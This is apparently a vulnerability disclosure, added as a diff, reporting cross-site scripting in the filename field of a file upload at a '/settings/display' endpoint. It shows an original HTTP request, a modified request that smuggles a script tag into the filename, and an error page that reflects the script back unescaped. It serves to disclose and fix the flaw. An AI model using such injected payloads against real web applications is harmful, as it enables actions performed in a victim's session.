@@ -1,0 +1,77 @@
+The "filename" parameter on File Upload functionality ("/settings/display" endpoint) is vulnerable to XSS attacks.This would result in unauthorized actions execution in the context of the authenticated user (e.g. admin). This can be used in conjuction with Social Engineering techniques.
+
+User Input Sanitization should be implemented for fixing this issue.
+
+Below, evidence is provided.
+
+
+Original Request:
+POST /settings/display HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------139269233962213431347920531
+Content-Length: 222
+Origin: http://1.1.1.1
+DNT: 1
+Connection: close
+Referer: http://1.1.1.1/settings/display
+Cookie: ksp=-175131256574077961
+Upgrade-Insecure-Requests: 1
+
+-----------------------------11439269233962213431347920531
+Content-Disposition: form-data; name="logo"; filename="file.txt"
+Content-Type: text/plain
+
+anything
+-----------------------------11439269233962213431347920531--
+
+
+
+
+
+
+Edited/Malicious Request:
+POST /settings/display HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------31439269233962213431347920531
+Content-Length: 247
+Origin: http://1.1.1.1
+DNT: 1
+Connection: close
+Referer: http://1.1.1.1/settings/display
+Cookie: ksp=-175131256574077961
+Upgrade-Insecure-Requests: 1
+
+-----------------------------11439269233962213431347920531
+Content-Disposition: form-data; name="logo"; filename="file<script>alert(1)</script>.txt"
+Content-Type: text/plain
+
+anything
+-----------------------------11439269233962213431347920531--
+
+
+
+
+Response:
+HTTP/1.0 403 Access forbidden
+Connection: close
+Content-type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>Error</title></head><body>
+<h1>Error 403 </h1>
+<p>Access forbidden</p>
+<p>It is not allowed to upload file (file<script>alert(1)</script>.txt)!</p></body>
+</html>
+
+
+
+
+
+
